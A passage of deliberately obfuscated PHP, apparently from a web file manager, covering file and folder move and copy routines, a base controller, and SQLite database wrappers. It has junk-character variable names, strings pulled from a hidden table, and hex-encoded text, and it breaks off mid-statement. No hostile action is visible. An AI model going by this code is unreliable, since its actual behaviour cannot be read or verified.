$¬×£ÛÛ‚ = $this->sourceInfo($°·—¹´¨); $–—’Šı = $¬×£ÛÛ‚[$ÀÊ¡¤ŞÆ[485]] == $ÀÊ¡¤ŞÆ[91]; $ûÇÚÀ”Å = $ûãÛ®òı ? $ûãÛ®òı : $¬×£ÛÛ‚[$ÀÊ¡¤ŞÆ[32]]; $´Áñœä = $this->fileNameExistAuto($òÅÏ‚Å®, $¬×£ÛÛ‚); $this->lockMoveStart($°·—¹´¨); $this->lockWriteStart($òÅÏ‚Å®, $ûÇÚÀ”Å); if (!$´Áñœä) { return $this->_moveForce($°·—¹´¨, $òÅÏ‚Å®, $ûÇÚÀ”Å); } $³‹¨†€… = $´Áñœä; $â¢•÷½‹ = !1; if ($–—’Šı) { if ($­±˜Ò³ == REPEAT_RENAME_FOLDER) { $ûÇÚÀ”Å = $this->fileNameAuto($òÅÏ‚Å®, $ûÇÚÀ”Å, $­±˜Ò³, $–—’Šı); $³‹¨†€… = $this->_moveForce($°·—¹´¨, $òÅÏ‚Å®, $ûÇÚÀ”Å); } else { if ($­±˜Ò³ == REPEAT_RENAME_FOLDER) { $­±˜Ò³ = REPEAT_RENAME; } $å±Å¡‰ñ = $this->_childrenListSelect($°·—¹´¨); foreach ($å±Å¡‰ñ as $˜ñåƒ¿ü) { $this->_move($˜ñåƒ¿ü[$ÀÊ¡¤ŞÆ[193]], $´Áñœä, $­±˜Ò³, $•¢ß†ì); } $â¢•÷½‹ = !0; } } else { if ($­±˜Ò³ == REPEAT_SKIP) { $â¢•÷½‹ = !0; } else { if ($­±˜Ò³ == REPEAT_RENAME || $­±˜Ò³ == REPEAT_RENAME_FOLDER) { $ûÇÚÀ”Å = $this->fileNameAuto($òÅÏ‚Å®, $ûÇÚÀ”Å, $­±˜Ò³, $–—’Šı); $³‹¨†€… = $this->_moveForce($°·—¹´¨, $òÅÏ‚Å®, $ûÇÚÀ”Å); } else { if ($­±˜Ò³ == REPEAT_REPLACE) { $÷ˆ›‡œ = $this->sourceInfoCache($´Áñœä); $ı³¯¨¨Ö = $this->fileHistory($÷ˆ›‡œ, $¬×£ÛÛ‚[$ÀÊ¡¤ŞÆ[541]], $¬×£ÛÛ‚[$ÀÊ¡¤ŞÆ[79]]); $â¢•÷½‹ = !0; if ($ı³¯¨¨Ö) { $•¢ß†ì[$ÀÊ¡¤ŞÆ[629]][] = $¬×£ÛÛ‚[$ÀÊ¡¤ŞÆ[541]]; } } } } } if ($â¢•÷½‹ && !$•¢ß†ì[$ÀÊ¡¤ŞÆ[660]]) { $•¢ß†ì[$ÀÊ¡¤ŞÆ[660]] = !0; } return $³‹¨†€…; } private function _moveForce($ØÊ®‹×, $ô‰ÊƒËğ, $â¨·É“Î) { $Î¹˜à¿ì =& $_SERVER[Ùæõ‰Ï’]; $áø–‹Ø’ = $this->sourceInfo($ØÊ®‹×); $ö¼Ÿ§·ß = $this->sourceInfo($ô‰ÊƒËğ); $‘²ùşë = $áø–‹Ø’[$Î¹˜à¿ì[485]] == $Î¹˜à¿ì[91]; $½ªÙæ‚Ã = array($Î¹˜à¿ì[477] => $ö¼Ÿ§·ß[$Î¹˜à¿ì[193]], $Î¹˜à¿ì[652] => $ö¼Ÿ§·ß[$Î¹˜à¿ì[584]] . $ö¼Ÿ§·ß[$Î¹˜à¿ì[193]] . $Î¹˜à¿ì[50], $Î¹˜à¿ì[648] => $ö¼Ÿ§·ß[$Î¹˜à¿ì[190]], $Î¹˜à¿ì[649] => $ö¼Ÿ§·ß[$Î¹˜à¿ì[569]], $Î¹˜à¿ì[651] => USER_ID, $Î¹˜à¿ì[494] => $â¨·É“Î); $ı¿ß¬ıç = $áø–‹Ø’[$Î¹˜à¿ì[190]] == SourceModel::TYPE_GROUP && $ö¼Ÿ§·ß[$Î¹˜à¿ì[190]] == SourceModel::TYPE_GROUP && $áø–‹Ø’[$Î¹˜à¿ì[569]] == $ö¼Ÿ§·ß[$Î¹˜à¿ì[569]]; if (!$ı¿ß¬ıç && $this->moveClearAuth) { Model($Î¹˜à¿ì[567])->authClear($ØÊ®‹×); } $®œÏòÓõ = $áø–‹Ø’[$Î¹˜à¿ì[505]] == $Î¹˜à¿ì[91] && $ö¼Ÿ§·ß[$Î¹˜à¿ì[505]] != $Î¹˜à¿ì[91]; if ($®œÏòÓõ) { $½ªÙæ‚Ã[$Î¹˜à¿ì[504]] = 0; } if ($‘²ùşë) { $Â·ò†ğÚ = array($Î¹˜à¿ì[652] => array($Î¹˜à¿ì[612], $áø–‹Ø’[$Î¹˜à¿ì[584]] . $áø–‹Ø’[$Î¹˜à¿ì[193]] . $Î¹˜à¿ì[613])); $„ê·¥–” = $áø–‹Ø’[$Î¹˜à¿ì[584]] . $áø–‹Ø’[$Î¹˜à¿ì[193]] . $Î¹˜à¿ì[50]; $şÍŠ¤¯ = $ö¼Ÿ§·ß[$Î¹˜à¿ì[584]] . $ö¼Ÿ§·ß[$Î¹˜à¿ì[193]] . $Î¹˜à¿ì[50] . $áø–‹Ø’[$Î¹˜à¿ì[193]] . $Î¹˜à¿ì[50]; $²ÜË»½‹ = array($Î¹˜à¿ì[652] => array($Î¹˜à¿ì[661], "\x72\x65\x70\x6c\x61\143\145\x28\160\x61\162\145\x6e\x74\114\x65\166\x65\x6c\x2c\47{$„ê·¥–”}\x27\54\x27{$şÍŠ¤¯}\x27\51"), $Î¹˜à¿ì[648] => $ö¼Ÿ§·ß[$Î¹˜à¿ì[190]], $Î¹˜à¿ì[649] => $ö¼Ÿ§·ß[$Î¹˜à¿ì[569]]); if ($®œÏòÓõ) { $²ÜË»½‹[$Î¹˜à¿ì[504]] = 0; } $this->where($Â·ò†ğÚ)->data($²ÜË»½‹)->save(); } $this->where(array($Î¹˜à¿ì[491] => $ØÊ®‹×))->data($½ªÙæ‚Ã)->save(); return $ØÊ®‹×; } private function clearShare($œ–§ …Ï, $ÇÆÓ‰ûñ) { $•Óé¡ïŸ =& $_SERVER[Ùæõ‰Ï’]; $‰ÇÕ¥Á” = $this->sourceInfo($œ–§ …Ï); $æƒ…Ùèß = $this->sourceInfo($ÇÆÓ‰ûñ); if ($‰ÇÕ¥Á”[$•Óé¡ïŸ[569]] == $æƒ…Ùèß[$•Óé¡ïŸ[569]] && $‰ÇÕ¥Á”[$•Óé¡ïŸ[190]] == $•Óé¡ïŸ[662]) { return; } $¼÷ÌÕ = array($•Óé¡ïŸ[584] => array($•Óé¡ïŸ[612], $‰ÇÕ¥Á”[$•Óé¡ïŸ[584]] . $œ–§ …Ï . $•Óé¡ïŸ[613])); $¡®ùçÅ = $this->field($•Óé¡ïŸ[491])->where($¼÷ÌÕ)->getField($•Óé¡ïŸ[193], !0); if (!$¡®ùçÅ) { return; } $¼÷ÌÕ = array($•Óé¡ïŸ[193] => array($•Óé¡ïŸ[7], $¡®ùçÅ), $•Óé¡ïŸ[663] => 1); $Ø•¼ÌàÓ = Model($•Óé¡ïŸ[664])->field($•Óé¡ïŸ[665])->where($¼÷ÌÕ)->select(); if (!$Ø•¼ÌàÓ) { return; } $Ø•¼ÌàÓ = array_to_keyvalue($Ø•¼ÌàÓ, $•Óé¡ïŸ[12], $•Óé¡ïŸ[665]); $¼÷ÌÕ = array($•Óé¡ïŸ[665] => array($•Óé¡ïŸ[7], $Ø•¼ÌàÓ)); Model($•Óé¡ïŸ[664])->where($¼÷ÌÕ)->save(array($•Óé¡ïŸ[663] => 0)); Model($•Óé¡ïŸ[666])->where($¼÷ÌÕ)->delete(); } public function copyFolderFromIO($·¯„·…¸, $¢Şá˜Ãá, $Ô¸ï¸â, $Èµ”ùÜÂ, $‚Ã¨ÉÅÁ, $”½—ãóÁ = false) { $ëŠœ‹õ² =& $_SERVER[Ùæõ‰Ï’]; $Ôƒüãİì = array($ëŠœ‹õ²[630] => array(), $ëŠœ‹õ²[631] => array(), $ëŠœ‹õ²[629] => array(), $ëŠœ‹õ²[667] => array()); $Â­”˜ÑÖ = $”½—ãóÁ ? $”½—ãóÁ : $·¯„·…¸->pathThis($¢Şá˜Ãá); $™ƒ›‘·Œ = $this->fileNameExist($Ô¸ï¸â, $Â­”˜ÑÖ); $Êµ³¹·® = $this->mkdir($Ô¸ï¸â, $Â­”˜ÑÖ, $Èµ”ùÜÂ); if (!$™ƒ›‘·Œ || $Èµ”ùÜÂ == REPEAT_RENAME_FOLDER) { $Èµ”ùÜÂ = !1; } if ($™ƒ›‘·Œ) { $this->_childrenAllMake($™ƒ›‘·Œ); } Hook::trigger($ëŠœ‹õ²[668]); $this->_copyChildTo($·¯„·…¸, $¢Şá˜Ãá, $Êµ³¹·®, $Èµ”ùÜÂ, $Ôƒüãİì, $‚Ã¨ÉÅÁ); Hook::trigger($ëŠœ‹õ²[669]); if ($Êµ³¹·®) { $this->folderSizeResetChildren($Êµ³¹·®); } $this->_childrenListClear(); Model($ëŠœ‹õ²[632])->addAll($Ôƒüãİì[$ëŠœ‹õ²[630]], array(), !0); Model($ëŠœ‹õ²[633])->eventCopy($Êµ³¹·®); $this->saveAll($Ôƒüãİì[$ëŠœ‹õ²[631]]); Model($ëŠœ‹õ²[544])->linkAdd($Ôƒüãİì[$ëŠœ‹õ²[629]]); Model($ëŠœ‹õ²[544])->remove($Ôƒüãİì[$ëŠœ‹õ²[667]]); $this->folderSizeReset($Ô¸ï¸â); $this->updateModifyTime($Ô¸ï¸â); return $Êµ³¹·®; } private function _copyChildTo($¼µ¯öë–, $êšÅ­Ì, $óõÑœ˜ı, $ÊŸ•ªï‘, &$›Äâê„ô, $íÛı„ì¶) { $Ò öÉ¢í =& $_SERVER[Ùæõ‰Ï’]; $Òá³ë¦ = $this->sourceInfoCache($óõÑœ˜ı); $°ªşµ¹® = $¼µ¯öë–->listPath($êšÅ­Ì); $°ªşµ¹® = $°ªşµ¹® ? $°ªşµ¹® : array($Ò öÉ¢í[86] => array(), $Ò öÉ¢í[85] => array()); $ÙÃÔä‹ = array_merge($°ªşµ¹®[$Ò öÉ¢í[86]], $°ªşµ¹®[$Ò öÉ¢í[85]]); $ÃİÔ ìÕ = $this->_addFiles($¼µ¯öë–, $°ªşµ¹®[$Ò öÉ¢í[86]], $íÛı„ì¶); $õÃµö° = array(); foreach ($ÙÃÔä‹ as &$á¯çèşú) { if (isset($ÃİÔ ìÕ[$á¯çèşú[$Ò öÉ¢í[32]]])) { $á¯çèşú = $ÃİÔ ìÕ[$á¯çèşú[$Ò öÉ¢í[32]]]; } $á¯çèşú[$Ò öÉ¢í[485]] = $á¯çèşú[$Ò öÉ¢í[33]] == $Ò öÉ¢í[78]; $á¯çèşú[$Ò öÉ¢í[486]] = substr(_get($á¯çèşú, $Ò öÉ¢í[169], $Ò öÉ¢í[12]), 0, 10); $á¯çèşú[$Ò öÉ¢í[79]] = _get($á¯çèşú, $Ò öÉ¢í[79], 0); $á¯çèşú[$Ò öÉ¢í[541]] = _get($á¯çèşú, $Ò öÉ¢í[541], 0); if (!isset($á¯çèşú[$Ò öÉ¢í[670]]) && $á¯çèşú[$Ò öÉ¢í[541]]) { $›Äâê„ô[$Ò öÉ¢í[667]][] = $á¯çèşú[$Ò öÉ¢í[541]]; } if ($ÊŸ•ªï‘) { $ø¢ãïÕ³ = $this->fileNameExistCache($óõÑœ˜ı, $á¯çèşú[$Ò öÉ¢í[32]]); if ($ø¢ãïÕ³) { if ($á¯çèşú[$Ò öÉ¢í[485]] || $ÊŸ•ªï‘ == REPEAT_SKIP) { continue; } if ($ÊŸ•ªï‘ == REPEAT_REPLACE) { $ÑÀ½ô‡ = $this->sourceInfoCache($ø¢ãïÕ³); $¨ŞŞÑ˜â = $this->fileHistory($ÑÀ½ô‡, $á¯çèşú[$Ò öÉ¢í[541]], $á¯çèşú[$Ò öÉ¢í[79]]); if ($¨ŞŞÑ˜â) { $›Äâê„ô[$Ò öÉ¢í[629]][] = $á¯çèşú[$Ò öÉ¢í[541]]; } continue; } else { if ($ÊŸ•ªï‘ == REPEAT_RENAME) { $á¯çèşú[$Ò öÉ¢í[32]] = $this->fileNameAutoCache($óõÑœ˜ı, $á¯çèşú[$Ò öÉ¢í[32]], $ÊŸ•ªï‘, !1); } } } } if (!$á¯çèşú[$Ò öÉ¢í[485]] && $á¯çèşú[$Ò öÉ¢í[541]] == 0) { continue; } if (!$á¯çèşú[$Ò öÉ¢í[485]] && $á¯çèşú[$Ò öÉ¢í[541]]) { $›Äâê„ô[$Ò öÉ¢í[629]][] = $á¯çèşú[$Ò öÉ¢í[541]]; } $õÃµö°[] = $this->_makeItemData($á¯çèşú, $Òá³ë¦, $á¯çèşú[$Ò öÉ¢í[32]]); } unset($á¯çèşú); if (!empty($õÃµö°)) { $this->addAll($õÃµö°); $this->_childrenListSelect($óõÑœ˜ı); } $µ±õ®ê = $this->_childrenList($óõÑœ˜ı); $µ±õ®ê = array_to_keyvalue($µ±õ®ê, $Ò öÉ¢í[32]); foreach ($ÙÃÔä‹ as $á¯çèşú) { $ÑÀ½ô‡ = $µ±õ®ê[$á¯çèşú[$Ò öÉ¢í[32]]]; $Ò×Šñìœ = $ÑÀ½ô‡[$Ò öÉ¢í[193]]; $this->_copyApplyMeta($ÑÀ½ô‡, $›Äâê„ô); if ($á¯çèşú[$Ò öÉ¢í[33]] == $Ò öÉ¢í[78]) { $á¯çèşú[$Ò öÉ¢í[87]] = $¼µ¯öë–->getPathInner($á¯çèşú[$Ò öÉ¢í[87]]); $this->_copyChildTo($¼µ¯öë–, $á¯çèşú[$Ò öÉ¢í[87]], $Ò×Šñìœ, $ÊŸ•ªï‘, $›Äâê„ô, $íÛı„ì¶); } } } private function _addFiles($İóĞ×±, $¢”ø©ª, $¥Íá‰šİ) { $µ§ô£´³ =& $_SERVER[Ùæõ‰Ï’]; if (!$¢”ø©ª || count($¢”ø©ª) == 0) { return array(); } $ÊŠ®­ = array(); foreach ($¢”ø©ª as &$çáÄ•û) { Hook::trigger($µ§ô£´³[671], $çáÄ•û); $çáÄ•û[$µ§ô£´³[87]] = $İóĞ×±->getPathInner($çáÄ•û[$µ§ô£´³[87]]); $šÎ¤ŒûÊ = $İóĞ×±->hashSimple($çáÄ•û[$µ§ô£´³[87]]); $–îâ§çŸ = $İóĞ×±->hashMd5($çáÄ•û[$µ§ô£´³[87]]); if (strlen($–îâ§çŸ) > 10 && !isset($ÊŠ®­[$–îâ§çŸ])) { $ÊŠ®­[$–îâ§çŸ] = array(); } $çáÄ•û[$µ§ô£´³[672]] = $šÎ¤ŒûÊ; $çáÄ•û[$µ§ô£´³[547]] = $–îâ§çŸ; $ÊŠ®­[$–îâ§çŸ][] =& $çáÄ•û; if (count($ÊŠ®­[$–îâ§çŸ]) > 1) { $çáÄ•û[$µ§ô£´³[670]] = !0; } Hook::trigger($µ§ô£´³[673], $çáÄ•û); } unset($çáÄ•û); $õì»ÆÚ™ = array($µ§ô£´³[547] => array($µ§ô£´³[7], array_keys($ÊŠ®­))); $‚ª±ğà  = Model($µ§ô£´³[674]); $¥´ÅÀ¦½ = $‚ª±ğà ->where($õì»ÆÚ™)->select(); $¥´ÅÀ¦½ = $¥´ÅÀ¦½ ? $¥´ÅÀ¦½ : array(); foreach ($¥´ÅÀ¦½ as $Î¨Í•ÊŸ) { if (!isset($ÊŠ®­[$Î¨Í•ÊŸ[$µ§ô£´³[547]]])) { continue; } $ÇßÀ“á¬ = $ÊŠ®­[$Î¨Í•ÊŸ[$µ§ô£´³[547]]]; foreach ($ÇßÀ“á¬ as &$çáÄ•û) { $çáÄ•û[$µ§ô£´³[541]] = $Î¨Í•ÊŸ[$µ§ô£´³[541]]; $çáÄ•û[$µ§ô£´³[670]] = !0; } unset($çáÄ•û); } $ığ‡§ì = array(); foreach ($¢”ø©ª as $ÚÁ…¨Ùæ) { Hook::trigger($µ§ô£´³[675], $ÚÁ…¨Ùæ); if (isset($ÚÁ…¨Ùæ[$µ§ô£´³[670]]) && $ÚÁ…¨Ùæ[$µ§ô£´³[670]]) { Hook::trigger($µ§ô£´³[676], $ÚÁ…¨Ùæ); continue; } $·áÍ§òÁ = $İóĞ×±->getPathInner($ÚÁ…¨Ùæ[$µ§ô£´³[87]]); $ÔøÓò‚¢ = $‚ª±ğà ->addFileMake($·áÍ§òÁ, $ÚÁ…¨Ùæ[$µ§ô£´³[79]], $ÚÁ…¨Ùæ[$µ§ô£´³[672]], $ÚÁ…¨Ùæ[$µ§ô£´³[547]], $ÚÁ…¨Ùæ[$µ§ô£´³[32]], $¥Íá‰šİ); Hook::trigger($µ§ô£´³[676], $ÚÁ…¨Ùæ); if (!is_array($ÔøÓò‚¢)) { continue; } $ığ‡§ì[] = $ÔøÓò‚¢; } $‚ª±ğà ->addAll($ığ‡§ì); $õì»ÆÚ™ = array($µ§ô£´³[547] => array($µ§ô£´³[7], array_keys($ÊŠ®­))); $¥´ÅÀ¦½ = $‚ª±ğà ->where($õì»ÆÚ™)->select(); $¥´ÅÀ¦½ = $¥´ÅÀ¦½ ? $¥´ÅÀ¦½ : array(); foreach ($¥´ÅÀ¦½ as $Î¨Í•ÊŸ) { if (!isset($ÊŠ®­[$Î¨Í•ÊŸ[$µ§ô£´³[547]]])) { continue; } $ã¾»“Æê =& $ÊŠ®­[$Î¨Í•ÊŸ[$µ§ô£´³[547]]]; foreach ($ã¾»“Æê as &$çáÄ•û) { $çáÄ•û[$µ§ô£´³[541]] = $Î¨Í•ÊŸ[$µ§ô£´³[541]]; } unset($çáÄ•û); } $°ÂÍ²—½ = array(); foreach ($¢”ø©ª as $¡Î°»”œ) { $°ÂÍ²—½[$¡Î°»”œ[$µ§ô£´³[32]]] = $¡Î°»”œ; } return $°ÂÍ²—½; } } define($_SERVER[Ùæõ‰Ï’][677], $_SERVER[Ùæõ‰Ï’][678]); $zvjtcnyder = $_SERVER[Ùæõ‰Ï’][679]; goto CŒó¦Š‡ù¯; e§¯èÄÊ®Ï: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Û­úîƒ =& $_SERVER[Ùæõ‰Ï’]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Û­úîƒ[6]] =& $config; $this->values[$Û­úîƒ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Û­úîƒ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($¦î¯ª×) { if (1 === func_num_args()) { $this->{$¦î¯ª×} = new $¦î¯ª×(); } else { $ÌÛá™¥ = new ReflectionClass($¦î¯ª×); $À‘ÉÖƒí = func_get_args(); array_shift($À‘ÉÖƒí); $this->{$¦î¯ª×} = $ÌÛá™¥->newInstanceArgs($À‘ÉÖƒí); } return $this->{$¦î¯ª×}; } public function routeBind($’§†¹”, $‰À²Ô££, $åÛ¨èªØ = 3) { $Á¿ÜöŠ =& $_SERVER[Ùæõ‰Ï’]; $úê÷Š¥« = $this->in[$Á¿ÜöŠ[9]]; $’§†¹” = str_replace($Á¿ÜöŠ[10], $Á¿ÜöŠ[11], trim(trim($’§†¹”, $Á¿ÜöŠ[8]), $Á¿ÜöŠ[12])); if (!$’§†¹” || count($úê÷Š¥«) <= $åÛ¨èªØ) { return !1; } $îÑ¹Ğ±° = !0; $Ò’Ì–„¹ = explode($Á¿ÜöŠ[8], $’§†¹”); for ($ë„º‹Â° = 0; $ë„º‹Â° < count($Ò’Ì–„¹); $ë„º‹Â°++) { if ($Ò’Ì–„¹[$ë„º‹Â°] != $úê÷Š¥«[$åÛ¨èªØ + $ë„º‹Â°]) { $îÑ¹Ğ±° = !1; break; } } if (!$îÑ¹Ğ±°) { return; } call_user_func_array(array($this, $‰À²Ô££), array()); } public function routeArgs($²¢ÜÙÅØ = 3) { $™¡Ôàğ´ = $this->in[$_SERVER[Ùæõ‰Ï’][9]]; if (count($™¡Ôàğ´) <= $²¢ÜÙÅØ) { return array(); } $İ®ƒÙî = array(); for ($ç‹Ï›‡ = $²¢ÜÙÅØ; $ç‹Ï›‡ < count($™¡Ôàğ´); $ç‹Ï›‡ += 2) { $İ®ƒÙî[$™¡Ôàğ´[$ç‹Ï›‡]] = $™¡Ôàğ´[$ç‹Ï›‡ + 1]; $this->in[$™¡Ôàğ´[$ç‹Ï›‡]] = $™¡Ôàğ´[$ç‹Ï›‡ + 1]; } return $İ®ƒÙî; } protected function assign($Õ­ˆÔ–, $¼àîÉÇˆ) { $this->values[$Õ­ˆÔ–] = $¼àîÉÇˆ; } protected function display($ÔİŒØğ•) { ob_end_clean(); extract($this->values); require $this->tpl . $ÔİŒØğ•; } } class DbSqliteBase extends Db { public function __construct($ãÂóÅ­ß = '') { $ÍşÚâº¨ =& $_SERVER[Ùæõ‰Ï’]; if (!extension_loaded($ÍşÚâº¨[13])) { think_exception(think_lang($ÍşÚâº¨[14]) . $ÍşÚâº¨[15]); } if (!empty($ãÂóÅ­ß)) { if (!isset($ãÂóÅ­ß[$ÍşÚâº¨[16]])) { $ãÂóÅ­ß[$ÍşÚâº¨[16]] = 438; } $this->config = $ãÂóÅ­ß; if (empty($this->config[$ÍşÚâº¨[17]])) { $this->config[$ÍşÚâº¨[17]] = array(); } } } public function connect($Ö¥ãåø = '', $º–ÈĞ£´ = 0) { $Á÷‹öñ  =& $_SERVER[Ùæõ‰Ï’]; if (!isset($this->linkID[$º–ÈĞ£´])) { if (empty($Ö¥ãåø)) { $Ö¥ãåø = $this->config; } $¥ğ“‚¦ = !empty($Ö¥ãåø[$Á÷‹öñ [17]][$Á÷‹öñ [18]]) ? $Ö¥ãåø[$Á÷‹öñ [17]][$Á÷‹öñ [18]] : $this->pconnect; $™É¸½ = $¥ğ“‚¦ ? $Á÷‹öñ [19] : $Á÷‹öñ [20]; $this->linkID[$º–ÈĞ£´] = $™É¸½($Ö¥ãåø[$Á÷‹öñ [21]], $Ö¥ãåø[$Á÷‹öñ [16]]); if (!$this->linkID[$º–ÈĞ£´]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$º–ÈĞ£´], 30000); if (1 != think_config($Á÷‹öñ [22])) { unset($this->config); } } return $this->linkID[$º–ÈĞ£´]; } public function free() { $this->queryID = null; } public function query($ù¹Ñëä) { $¨Éİºó =& $_SERVER[Ùæõ‰Ï’]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ù¹Ñëä; if ($this->queryID) { $this->free(); } think_action_status($¨Éİºó[23], 1); think_status($¨Éİºó[24]); $this->queryID = sqlite_query($this->_linkID, $ù¹Ñëä); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $­ÌÇÕíÜ = $this->getAll(); return $­ÌÇÕíÜ; } } public function execute($Ñ†ûÆÌì) { $­œÄêÌ =& $_SERVER[Ùæõ‰Ï’]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ñ†ûÆÌì; if ($this->queryID) { $this->free(); } think_action_status($­œÄêÌ[25], 1); think_status($­œÄêÌ[24]); $»ƒï¯Ì = sqlite_exec($this->_linkID, $Ñ†ûÆÌì); $this->debug(); if (!1 === $»ƒï¯Ì) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ùæõ‰Ï’][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $»Üà×ã÷ = sqlite_query($this->_linkID, $_SERVER[Ùæõ‰Ï’][27]); if (!$»Üà×ã÷) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $üãÈŒÙØ = sqlite_query($this->_linkID, $_SERVER[Ùæõ‰Ï’][28]); if (!$üãÈŒÙØ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¶ŞüÆËô = array(); if ($this->numRows > 0) { for ($«–ç¿—Ñ = 0; $«–ç¿—Ñ < $this->numRows; $«–ç¿—Ñ++) { $¶ŞüÆËô[$«–ç¿—Ñ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¶ŞüÆËô; } public function getFields($ä‚ıÍŠÚ) { $†îÀ¢€£ =& $_SERVER[Ùæõ‰Ï’]; $‘›½Ûš = $this->query($†îÀ¢€£[29] . $ä‚ıÍŠÚ . $†îÀ¢€£[30]); $‹²¬ˆêì = array(); if ($‘›½Ûš) { foreach ($‘›½Ûš as $Î  ¡€ => $¢¹ÃÊ‹€) { $‹²¬ˆêì[$¢¹ÃÊ‹€[$†îÀ¢€£[31]]] = array($†îÀ¢€£[32] => $¢¹ÃÊ‹€[$†îÀ¢€£[31]], $†îÀ¢€£[33] => $¢¹ÃÊ‹€[$†îÀ¢€£[34]], $†îÀ¢€£[35] => (bool) ($¢¹ÃÊ‹€[$†îÀ¢€£[36]] === $†îÀ¢€£[12]), $†îÀ¢€£[37] => $¢¹ÃÊ‹€[$†îÀ¢€£[38]], $†îÀ¢€£[39] => strtolower($¢¹ÃÊ‹€[$†îÀ¢€£[40]]) == $†îÀ¢€£[41], $†îÀ¢€£[42] => strtolower($¢¹ÃÊ‹€[$†îÀ¢€£[43]]) == $†îÀ¢€£[44]); } } return $‹²¬ˆêì; } public function getTables($˜û˜¡ºÂ = '') { $Ú÷ëºë­ =& $_SERVER[Ùæõ‰Ï’]; $—œÖ¿Îô = $this->query($Ú÷ëºë­[45] . $Ú÷ëºë­[46] . $Ú÷ëºë­[47]); $³ìŒç“Ç = array(); foreach ($—œÖ¿Îô as $¥°ú±º => $‘´¿¨á€) { $³ìŒç“Ç[$¥°ú±º] = current($‘´¿¨á€); } return $³ìŒç“Ç; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ˆÌ•ƒ¬Ğ =& $_SERVER[Ùæõ‰Ï’]; $º¤‰Ğì½ = sqlite_last_error($this->_linkID); $this->error = $º¤‰Ğì½ . $ˆÌ•ƒ¬Ğ[4] . sqlite_error_string($º¤‰Ğì½); if ($ˆÌ•ƒ¬Ğ[12] != $this->queryStr) { $this->error .= LNG($ˆÌ•ƒ¬Ğ[48]) . $this->queryStr; } think_trace($this->error, $ˆÌ•ƒ¬Ğ[12], $ˆÌ•ƒ¬Ğ[49]); return $this->error; } public function escapeString($›Êû°Ç¾) { return sqlite_escape_string($›Êû°Ç¾); } public function parseLimit($¯‰¹ÍË’) { $ Ì¹ªÈ¯ =& $_SERVER[Ùæõ‰Ï’]; $ªúÑ²šö = $ Ì¹ªÈ¯[12]; if (!empty($¯‰¹ÍË’)) { $¯‰¹ÍË’ = explode($ Ì¹ªÈ¯[50], $¯‰¹ÍË’); if (count($¯‰¹ÍË’) > 1) { $ªúÑ²šö .= $ Ì¹ªÈ¯[51] . $¯‰¹ÍË’[1] . $ Ì¹ªÈ¯[52] . $¯‰¹ÍË’[0] . $ Ì¹ªÈ¯[53]; } else { $ªúÑ²šö .= $ Ì¹ªÈ¯[51] . $¯‰¹ÍË’[0] . $ Ì¹ªÈ¯[53]; } } return $ªúÑ²šö; } } class DbSqlite3Base extends Db { public function __construct($¬ÖªïŞ = '') { $ˆ’˜ËÂ =& $_SERVER[Ùæõ‰Ï’]; if (!class_exists($ˆ’˜ËÂ[54])) { think_exception(think_lang($ˆ’˜ËÂ[14]) . $ˆ’˜ËÂ[55]); } if (!empty($¬ÖªïŞ)) { if (!isset($¬ÖªïŞ[$ˆ’˜ËÂ[16]])) { $¬ÖªïŞ[$ˆ’˜ËÂ[16]] = 438; } $this->config = $¬ÖªïŞ; if (empty($this->config[$ˆ’˜ËÂ[17]])) { $this->config[$ˆ’˜ËÂ[17]] = array(); } } } public function connect($íö²èô† = '', $­Çç»šƒ = 0) { $áãŸ½€˜ =& $_SERVER[Ùæõ‰Ï’]; if (!isset($this->linkID[$­Çç»šƒ])) { if (empty($íö²èô†)) { $íö²èô† = $this->config; } $this->linkID[$­Çç»šƒ] = new SQLite3($íö²èô†[$áãŸ½€˜[21]]); if (!$this->linkID[$­Çç»šƒ]) { think_exception($this->linkID[$­Çç»šƒ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$­Çç»šƒ]->busyTimeout(30000); if (1 != think_config($áãŸ½€˜[22])) { unset($this->config); } } return $this->linkID[$­Çç»šƒ]; } public function free() { $this->queryID = null; } public function query($âŞ¾®¾ì) { $ÖùÆåÕ =& $_SERVER[Ùæõ‰Ï’]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $âŞ¾®¾ì; if ($this->queryID) { $this->free(); } think_action_status($ÖùÆåÕ[23], 1); think_status($ÖùÆåÕ[24]); $this->queryID = $this->_linkID->query($âŞ¾®¾ì); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $šŞÖ¢Ûµ = $this->getAll(); $this->numRows = count($šŞÖ¢Ûµ); return $šŞÖ¢Ûµ; } } public function execute($Òì–¤ç) { $àŸœÀíà =& $_SERVER[Ùæõ‰Ï’]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Òì–¤ç; if ($this->queryID) { $this->free(); } think_action_status($àŸœÀíà[25], 1); think_status($àŸœÀíà[24]); $§·¸¾èû = $this->_linkID->exec($Òì–¤ç); $this->debug(); if (!1 === $§·¸¾èû) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ùæõ‰Ï’][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ƒ–úº¾ = 